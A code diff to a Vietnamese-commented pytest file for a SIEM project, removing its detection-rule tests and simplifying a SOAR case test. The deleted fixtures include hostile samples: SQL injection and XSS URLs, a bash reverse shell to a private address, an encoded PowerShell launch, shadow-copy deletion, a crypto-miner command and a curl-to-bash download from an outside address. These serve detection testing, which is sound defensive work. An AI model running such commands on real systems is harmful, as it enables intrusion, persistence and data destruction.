@@ -1,4 +1,4 @@
-"""Unit test cho normalize + enrich + rule engine + ML + SOAR (không cần Kafka/ES).
+"""Unit test cho normalize + enrich + ML + SOAR (không cần Kafka/ES).
 Chạy: cd server && python -m pytest -q
 """
 from __future__ import annotations
@@ -10,9 +10,8 @@ from pathlib import Path
 
 import pytest
 
-from siem.detection import alerts as alert_builder
+from siem.detection.alerts import SEVERITY_SCORE
 from siem.detection.ml import AnomalyDetector
-from siem.detection.rules import RuleEngine, load_rules
 from siem.pipeline.enrich import Enricher
 from siem.pipeline.normalize import get, normalize
 
@@ -35,20 +34,6 @@ def enricher():
     return Enricher(ROOT / "config")
 
 
-@pytest.fixture()
-def engine():
-    return RuleEngine(load_rules(ROOT / "rules"))
-
-
-def run(engine, enricher, raws):
-    fired = []
-    for r in raws:
-        doc = enricher.enrich(normalize(r))
-        fired += [d.rule.id for d in engine.process(doc)]
-    return fired
-
-
-# ------------------------------------------------------------------ normalize
 def test_apache_access_parse():
     d = normalize(apache("10.0.0.5", "GET /index.php?id=1%27%20UNION%20SELECT%201,2-- HTTP/1.1", 200))
     assert get(d, "source.ip") == "10.0.0.5"
@@ -224,139 +209,6 @@ def test_threat_intel_and_assets(enricher):
     assert get(d, "source.ip_scope") == "public"
 
 
-# ------------------------------------------------------------------ rules
-def test_rules_load(engine):
-    assert len(engine.rules) >= 35
-
-
-@pytest.mark.parametrize("req,rule", [
-    ("GET /item.php?id=1%27%20or%20%271%27=%271 HTTP/1.1", "WEB-001"),
-    ("GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1", "WEB-002"),
-    ("GET /view?file=../../../../etc/passwd HTTP/1.1", "WEB-003"),
-    ("GET /ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1", "WEB-004"),
-    ("GET /uploads/shell.php?cmd=id HTTP/1.1", "WEB-008"),
-])
-def test_web_attacks(engine, enricher, req, rule):
-    assert rule in run(engine, enricher, [apache("10.0.0.50", req)])
-
-
-def test_benign_web_no_alert(engine, enricher):
-    reqs = ["GET / HTTP/1.1", "GET /products?id=12&sort=price HTTP/1.1", "GET /static/app.js HTTP/1.1",
-            "POST /api/cart HTTP/1.1", "GET /blog/select-the-best-union-plan HTTP/1.1"]
-    assert run(engine, enricher, [apache("10.0.0.51", r) for r in reqs]) == []
-
-
-def test_scanner_ua(engine, enricher):
-    assert "WEB-005" in run(engine, enricher, [apache("10.0.0.52", "GET / HTTP/1.1", ua="sqlmap/1.7#stable")])
-
-
-def test_ssh_bruteforce_then_success(engine, enricher):
-    evs = [raw("auth", {"message": f"Sep 24 10:00:0{i} web01 sshd[9{i}]: Failed password for root from 10.9.9.9 port 5000{i} ssh2"},
-               ts=T0 + timedelta(seconds=i)) for i in range(6)]
-    evs.append(raw("auth", {"message": "Sep 24 10:00:09 web01 sshd[99]: Accepted password for root from 10.9.9.9 port 50010 ssh2"},
-                   ts=T0 + timedelta(seconds=9)))
-    fired = run(engine, enricher, evs)
-    assert fired.count("AUTH-001") == 1   # threshold chỉ bắn 1 lần nhờ suppress
-    assert "AUTH-002" in fired            # sequence: brute-force rồi thành công
-    assert "AUTH-004" in fired            # đăng nhập root
-
-
-def test_threshold_respects_window(engine, enricher):
-    # 5 lần thất bại nhưng rải trong 5 phút -> không phải brute-force
-    evs = [raw("auth", {"message": f"Sep 24 10:0{i}:00 web01 sshd[1]: Failed password for bob from 10.8.8.8 port 1 ssh2"},
-               ts=T0 + timedelta(minutes=i)) for i in range(5)]
-    assert "AUTH-001" not in run(engine, enricher, evs)
-
-
-def test_port_scan_distinct(engine, enricher):
-    evs = [raw("syslog", {"message": f"Sep 24 10:00:00 fw kernel: DROP IN=eth0 SRC=10.7.7.7 DST=192.168.1.10 PROTO=TCP SPT=40000 DPT={p}",
-                          "sender_ip": "192.168.1.1"}, source="syslog", ts=T0 + timedelta(milliseconds=p)) for p in range(20, 45)]
-    assert "NET-001" in run(engine, enricher, evs)
-
-
-def test_windows_rules(engine, enricher):
-    def win(eid, fields, channel="Security"):
-        return raw("windows_event", {"event_id": eid, "channel": channel, "fields": fields}, source="eventlog", agent="A001-PC-01")
-    fired = run(engine, enricher, [
-        win(1102, {"SubjectUserName": "eve"}),
-        win(4732, {"TargetUserName": "Administrators", "MemberName": "CN=eve"}),
-        win(1, {"Image": "C:\\x\\powershell.exe", "ParentImage": "C:\\x\\WINWORD.EXE",
-                "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA="},
-            channel="Microsoft-Windows-Sysmon/Operational"),
-        win(1, {"Image": "C:\\x\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet"},
-            channel="Microsoft-Windows-Sysmon/Operational"),
-    ])
-    for rid in ("WIN-002", "WIN-004", "WIN-005", "WIN-008", "WIN-010"):
-        assert rid in fired, rid
-
-
-def test_linux_process_rules(engine, enricher):
-    def proc(name, cmd, parent="bash"):
-        return raw("process_creation", {"pid": 4321, "ppid": 1, "name": name, "command_line": cmd, "parent_name": parent}, source="process")
-    fired = run(engine, enricher, [
-        proc("bash", "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"),
-        proc("sh", "sh -c id", parent="apache2"),
-        proc("xmrig", "./xmrig -o stratum+tcp://pool:3333"),
-    ])
-    assert {"LNX-001", "LNX-002", "LNX-004"} <= set(fired)
-
-
-def test_rules_ignore_admin_tools_but_keep_attacks(enricher):
-    """Báo nhầm lộ ra khi tập lệnh bình thường mở rộng (12/10/2026): WIN-005 bắt lớp vỏ PowerShell của Ansible qua WinRM,
-    WIN-013 bắt mọi `schtasks /create` (cả tác vụ sao lưu), LNX-003 bắt bộ cài chính thức dạng `curl ... | bash`.
-    Mỗi lệnh chạy trên engine riêng để chặn alert lặp không che kết quả."""
-    rules = load_rules(ROOT / "rules")
-    ps, st = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\System32\\schtasks.exe"
-
-    def win(image, cmd):
-        return raw("windows_event", {"event_id": 1, "channel": "Microsoft-Windows-Sysmon/Operational",
-                                     "fields": {"Image": image, "CommandLine": cmd}}, source="eventlog", agent="A001-PC-01")
-
-    def proc(cmd, name="sh"):
-        return raw("process_creation", {"pid": 4321, "ppid": 1, "name": name, "command_line": cmd, "parent_name": "bash"},
-                   source="process")
-
-    def fired(ev):
-        return set(run(RuleEngine(rules), enricher, [ev]))
-
-    benign = {
-        "WIN-005": [win(ps, "PowerShell  -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand "
-                            "UwBlAHQALQBTAHQAcgBpAGMAdABNAG8AZABlACAALQBWAGUAcgBzAGkAbwBuACAATABhAHQAZQBzAHQA"),
-                    win(ps, '"powershell.exe" -noninteractive -encodedcommand '
-                            "WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAA")],
-        "WIN-013": [win(st, 'schtasks /create /tn "Backup\\Nightly" /tr "C:\\Scripts\\backup.cmd" /sc daily /st 23:00 /ru SYSTEM /f')],
-        "LNX-003": [proc("bash -c 'curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash'", "bash"),
-                    proc("sh -c 'wget -qO- https://get.docker.com | sh'")],
-    }
-    attack = {
-        "WIN-005": [win(ps, "powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAA="),
-                    win(ps, '"powershell.exe" -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAHkALAAgAEEAdABvAG0AaQBjACEAIgA=')],
-        "WIN-013": [win(st, 'schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"'),
-                    win(st, 'schtasks /Create /TN "CompMgmtBypass" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F'),
-                    win(st, 'schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db" /sc MINUTE /f'),
-                    win(st, 'SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10')],
-        "LNX-003": [proc("sh -c 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/"
-                         "T1074.001/src/Discovery.sh | sh -s'"),
-                    # cùng lệnh có bộ cài chính thức và một script lạ: đoạn lạ vẫn bị bắt
-                    proc("sh -c 'curl -fsSL https://get.docker.com | sh; curl -s http://203.0.113.5/x.sh | bash'")],
-    }
-    for rid, evs in benign.items():
-        for ev in evs:
-            assert rid not in fired(ev), (rid, ev["data"])
-    for rid, evs in attack.items():
-        for ev in evs:
-            assert rid in fired(ev), (rid, ev["data"])
-
-
-def test_alert_document(engine, enricher):
-    doc = enricher.enrich(normalize(apache("198.51.100.23", "GET /a?id=1%20union%20select%201 HTTP/1.1")))
-    dets = engine.process(doc)
-    a = alert_builder.from_detection(next(d for d in dets if d.rule.id == "WEB-001"))
-    assert a["source"]["ip"] == "198.51.100.23" and a["agent"]["id"] == "S001-Web-01"
-    assert a["severity_score"] == 3 and a["risk_score"] > 75  # asset critical=high + TI hit
-    assert "raw" not in a["trigger_event"]
-
-
 # ------------------------------------------------------------------ ML
 def test_ml_flags_scanner_not_normal(enricher):
     det = AnomalyDetector(window=60, min_samples=10_000, bootstrap=True)
@@ -443,15 +295,10 @@ def test_case_playbook_selection_and_tasks():
     assert any(t["approval"] for t in f["tasks"]) and not any(t["done"] for t in f["tasks"])
 
 
-def test_every_rule_gets_a_specific_case_playbook():
-    """Mỗi rule có quy trình đúng loại sự cố (không rơi vào PB-00 "Điều tra chung"); nhãn duyệt đều có trong bảng
-    phân quyền (api.APPROVAL_PERMISSIONS), mã playbook không trùng."""
+def test_case_playbook_ids_unique_and_approval_labels_known():
+    """Nhãn duyệt đều có trong bảng phân quyền (api.APPROVAL_PERMISSIONS), mã playbook không trùng."""
     import yaml
     from siem.manager.api import APPROVAL_PERMISSIONS
-    from siem.soar.cases import CasePlaybooks
-    cp = CasePlaybooks(ROOT / "config" / "case_playbooks.yml")
-    for r in load_rules(ROOT / "rules"):
-        assert cp.select(r.id, r.mitre.get("technique"), r.tags)[0]["id"] != "PB-00", r.id
     data = yaml.safe_load((ROOT / "config" / "case_playbooks.yml").read_text(encoding="utf-8"))
     pbs = data["playbooks"]
     assert len({p["id"] for p in pbs}) == len(pbs)
@@ -521,24 +368,22 @@ def test_soar_opens_case_for_every_medium_alert():
     """Trước 11/10/2026 chỉ alert khớp playbook phản ứng riêng mới có case: 23/40 rule (vd WIN-004 thêm vào nhóm quản
     trị, WIN-002 xóa nhật ký mức critical) không bao giờ có case, PB-04 / PB-05 không bao giờ được dùng. Giờ mọi alert
     từ medium có đúng 1 case (đúng case playbook), từ high có đúng 1 thông báo."""
-    from siem.detection.alerts import SEVERITY_SCORE
     from siem.soar.cases import CasePlaybooks
     from siem.soar.engine import Notifier, Soar, load_playbooks
     cp = CasePlaybooks(ROOT / "config" / "case_playbooks.yml")
-    for r in load_rules(ROOT / "rules"):
+    rule = {"id": "X-001", "name": "SQLi", "tags": ["web"], "mitre": {"tactic": None, "technique": ["T1190"]}}
+    for sev, score in SEVERITY_SCORE.items():
         es = FakeES()
         soar = Soar(es, load_playbooks(ROOT / "config" / "playbooks.yml"), whitelist=[], notifier=Notifier(),
                     case_playbooks=cp)
-        res = soar.handle({"alert": {"id": f"a-{r.id}", "source": "rule"}, "severity": r.severity,
-                           "severity_score": SEVERITY_SCORE[r.severity], "agent": {"id": "001"}, "message": "x",
-                           "source": {"ip": "203.0.113.7"}, "process": {"pid": 4242, "name": "sh"},
-                           "rule": {"id": r.id, "name": r.title, "tags": r.tags, "mitre": r.mitre}})
+        res = soar.handle({"alert": {"id": f"a-{sev}", "source": "rule"}, "severity": sev, "severity_score": score,
+                           "agent": {"id": "001"}, "message": "x", "source": {"ip": "203.0.113.7"},
+                           "process": {"pid": 4242, "name": "sh"}, "rule": rule})
         cases = list(es.docs.get("siem-cases", {}).values())
         notified = [x for x in res if x["action"] == "notify" and x["status"] != "skipped"]
-        medium = SEVERITY_SCORE[r.severity] >= SEVERITY_SCORE["medium"]
-        assert len(cases) == (1 if medium else 0), r.id
-        assert not cases or cases[0]["playbook"]["id"] == cp.select(r.id, r.mitre.get("technique"), r.tags)[0]["id"]
-        assert len(notified) == (1 if SEVERITY_SCORE[r.severity] >= SEVERITY_SCORE["high"] else 0), r.id
+        assert len(cases) == (1 if score >= SEVERITY_SCORE["medium"] else 0), sev
+        assert not cases or cases[0]["playbook"]["id"] == cp.select(rule["id"], rule["mitre"]["technique"], rule["tags"])[0]["id"]
+        assert len(notified) == (1 if score >= SEVERITY_SCORE["high"] else 0), sev
 
 
 def test_soar_case_gets_playbook():
@@ -571,27 +416,6 @@ def test_priority_matrix_by_asset_criticality():
     assert met("2026-10-13T10:20:00+00:00", d["ack_due"]) is False
     with pytest.raises(ValueError):
         Policy({"high": ("P1", "P2")})
-
-
-def test_alert_priority_detection_time_and_shadow_mode():
-    """Alert mang ưu tiên theo tài sản và thời gian phát hiện từ event ĐẦU TIÊN của chuỗi (KPI MTTD); rule `mode:
-    shadow` sinh alert gắn alert.shadow."""
-    from siem.ai.condition import Rule
-    rule = Rule.from_dict({"id": "T-001", "title": "thử", "severity": "high", "type": "threshold", "mode": "shadow",
-                           "condition": {"field": "event.outcome", "op": "eq", "value": "failure"},
-                           "threshold": {"count": 3, "window": 600, "group_by": ["source.ip"]}})
-    eng = RuleEngine([rule])
-    dets = []
-    for i in range(3):
-        dets += eng.process({"@timestamp": (T0 + timedelta(seconds=60 * i)).isoformat(), "event": {
-            "id": f"e{i}", "outcome": "failure"}, "source": {"ip": "203.0.113.5"},
-            "asset": {"criticality": "critical"}})
-    assert len(dets) == 1 and dets[0].first_time == T0.timestamp()
-    a = alert_builder.from_detection(dets[0])
-    assert a["priority"] == "P1" and a["first_event_time"] == T0.isoformat()
-    assert a["metrics"]["ttd_seconds"] > 0 and a["alert"]["shadow"] is True and a["rule"]["mode"] == "shadow"
-    with pytest.raises(ValueError, match="mode"):
-        Rule.from_dict({"id": "T-2", "title": "x", "mode": "test", "condition": {"field": "a", "op": "exists"}})
 
 
 def test_soar_ignores_shadow_alerts_and_case_inherits_priority():
